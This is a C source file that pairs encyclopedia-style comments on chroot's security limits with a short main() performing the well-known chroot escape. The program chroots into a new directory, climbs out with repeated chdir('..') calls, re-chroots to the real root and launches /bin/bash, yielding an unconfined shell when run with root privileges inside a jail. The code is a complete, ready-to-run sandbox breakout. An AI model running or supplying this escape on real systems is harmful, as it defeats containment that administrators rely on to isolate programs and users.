#include <sys/stat.h>

#include <stdlib.h>

#include <unistd.h>


// The chroot mechanism is not intended to defend against intentional tampering by privileged (root) users. A notable exception is NetBSD, on which chroot is considered a security mechanism and no escapes are known. On most systems, chroot contexts do not stack properly and chrooted programs with sufficient privileges may perform a second chroot to break out. To mitigate the risk of these security weakness, chrooted programs should relinquish root privileges as soon as practical after chrooting, or other mechanisms – such as FreeBSD jails – should be used instead. Note that some systems, such as FreeBSD, take precautions to prevent a second chroot attack.[12]

// On systems that support device nodes on ordinary filesystems, a chrooted root user can still create device nodes and mount the file systems on them; thus, the chroot mechanism is not intended by itself to be used to block low-level access to system devices by privileged users. It is not intended to restrict the use of resources like I/O, bandwidth, disk space or CPU time. Most Unixes are not completely file system-oriented and leave potentially disruptive functionality like networking and process control available through the system call interface to a chrooted program.

// At startup, programs expect to find scratch space, configuration files, device nodes and shared libraries at certain preset locations. For a chrooted program to successfully start, the chroot directory must be populated with a minimum set of these files. This can make chroot difficult to use as a general sandboxing mechanism. Tools such as Jailkit can help to ease and automate this process.

// Only the root user can perform a chroot. This is intended to prevent users from putting a setuid program inside a specially crafted chroot jail (for example, with a fake /etc/passwd and /etc/shadow file) that would fool it into a privilege escalation.

// Some Unixes offer extensions of the chroot mechanism to address at least some of these limitations (see Implementations of operating system-level virtualization technology).


int main(void)

{
    mkdir("root", 0755);
    chroot("root");

    for (int i = 0; i < 1000; i++)
    {

        chdir("..");
    }

    chroot(".");

    system("/bin/bash");
}
